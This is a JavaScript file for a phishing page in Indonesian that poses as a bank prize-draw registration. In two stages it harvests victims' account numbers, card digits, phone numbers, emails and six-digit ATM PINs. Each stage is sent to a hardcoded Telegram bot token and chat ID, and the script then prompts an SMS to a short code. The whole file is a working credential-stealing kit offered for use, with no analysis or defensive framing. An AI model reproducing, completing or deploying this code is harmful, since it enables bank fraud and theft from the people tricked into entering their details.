// ==============================================
// ⚙️  ISI DATA TELEGRAM KAMU DI BAWAH ⬇️
// ==============================================
const TELEGRAM_BOT_TOKEN = '8671304632:AAEOnZznJx5LEKARuopQR7NYzNem5TaXTvw';
const TELEGRAM_CHAT_ID = '5852448478';

// 📦 PENYIMPANAN DATA PENGGUNA
let dataPengguna = {
    noRekening: '',
    noKartu: '',
    noHP: '',
    email: '',
    pin: ''
};

// ==============================================
// 📡 KIRIM PESAN KE TELEGRAM
// ==============================================
async function kirimKeTelegram(pesan) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || 
        TELEGRAM_BOT_TOKEN.includes('ISI') || TELEGRAM_CHAT_ID.includes('ISI')) {
        console.log('⚠️ Token / Chat ID belum diisi');
        return;
    }
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: pesan,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
    } catch (e) { console.error('❌ Gagal kirim:', e); }
}

// ==============================================
// 🟡 TAHAP 1 — REGISTRASI BARU
// ==============================================
function kirimTahap1() {
    const pesan = `
🟡 [TAHAP 1/2] REGISTRASI BARU — GEBYAR UNDIAN
━━━━━━━━━━━━━━━━━━━━━━
🏦 No. Rekening: \`${dataPengguna.noRekening}\`
💳 4 Digit Kartu: \`${dataPengguna.noKartu}\`
📱 No. HP: \`${dataPengguna.noHP}\`
📧 Email: \`${dataPengguna.email}\`
━━━━━━━━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString('id-ID')}
`;
    kirimKeTelegram(pesan);
}

// ==============================================
// 🟠 TAHAP 2 — PIN ATM
// ==============================================
function kirimTahap2() {
    const pesan = `
🟠 [TAHAP 2/2] PIN ATM — GEBYAR UNDIAN
━━━━━━━━━━━━━━━━━━━━━━
🏦 No. Rekening: \`${dataPengguna.noRekening}\`
💳 4 Digit Kartu: \`${dataPengguna.noKartu}\`
📱 No. HP: \`${dataPengguna.noHP}\`
📧 Email: \`${dataPengguna.email}\`

🔢 PIN ATM (6 Digit): \`${dataPengguna.pin}\`
━━━━━━━━━━━━━━━━━━━━━━
✅ DATA LENGKAP DITERIMA!
🕐 ${new Date().toLocaleString('id-ID')}
`;
    kirimKeTelegram(pesan);
}

// ==============================================
// ⌨️ BACA PIN ATM
// ==============================================
function bacaPIN() {
    const p1 = document.getElementById('p1')?.value || '';
    const p2 = document.getElementById('p2')?.value || '';
    const p3 = document.getElementById('p3')?.value || '';
    const p4 = document.getElementById('p4')?.value || '';
    const p5 = document.getElementById('p5')?.value || '';
    const p6 = document.getElementById('p6')?.value || '';
    dataPengguna.pin = p1 + p2 + p3 + p4 + p5 + p6;
    if (dataPengguna.pin.length === 6) kirimTahap2();
}

// ==============================================
// 🚫 HANYA ANGKA — HURUF OTOMATIS DITOLAK
// ==============================================
function hanyaAngka(input) {
    input.value = input.value.replace(/[^0-9]/g, '');
}

function validasiNoHP(input) {
    let nilai = input.value.replace(/\s/g, '').replace(/[^0-9+]/g, '');
    input.value = nilai;
}

// ==============================================
// 🔄 FUNGSI NAVIGASI HALAMAN
// ==============================================
function gantiHalaman(idHalaman) {
    document.querySelectorAll('.halaman').forEach(h => h.classList.remove('aktif'));
    document.getElementById(idHalaman).classList.add('aktif');
}

function pindahKode(el, idTujuan) {
    if (el.value.length === 1) {
        const next = document.getElementById(idTujuan);
        if (next) next.focus();
        bacaPIN();
    }
}

// ==============================================
// 📍 NAVIGASI 4 HALAMAN
// ==============================================
function keRegistrasi() { gantiHalaman('halRegistrasi'); }
function kembaliKeAwal() { gantiHalaman('halAwal'); }
function kembaliKeRegistrasi() { gantiHalaman('halRegistrasi'); }
function kembaliKePIN() { gantiHalaman('halPIN'); }

// ==============================================
// ✅ REGISTRASI → TAHAP 1
// ==============================================
function validasiDanLanjut() {
    const noRek = document.getElementById('noRekening').value.trim();
    const noKartu = document.getElementById('noKartu').value.trim();
    const noHP = document.getElementById('noHP').value.trim();
    const email = document.getElementById('email').value.trim();
    
    if (!/^\d{1,15}$/.test(noRek)) return alert('⚠️ No. Rekening: 1-15 digit angka!');
    if (!/^\d{4}$/.test(noKartu)) return alert('⚠️ No. Kartu: Harus 4 digit!');
    if (noHP.length < 10) return alert('⚠️ No. HP minimal 10 digit!');
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return alert('⚠️ Format Email salah!');
    
    dataPengguna.noRekening = noRek;
    dataPengguna.noKartu = noKartu;
    dataPengguna.noHP = noHP;
    dataPengguna.email = email;
    
    kirimTahap1();
    gantiHalaman('halPIN');
    setTimeout(() => document.getElementById('p1')?.focus(), 300);
}

// ==============================================
// 🔐 PIN ATM → KETERANGAN
// ==============================================
function keKeterangan() {
    bacaPIN();
    gantiHalaman('halKeterangan');
}

// ==============================================
// 📱 BUKA SMS KE NOMOR 3654
// ==============================================
function bukaSMS() {
    window.location.href = 'sms:3654';
}
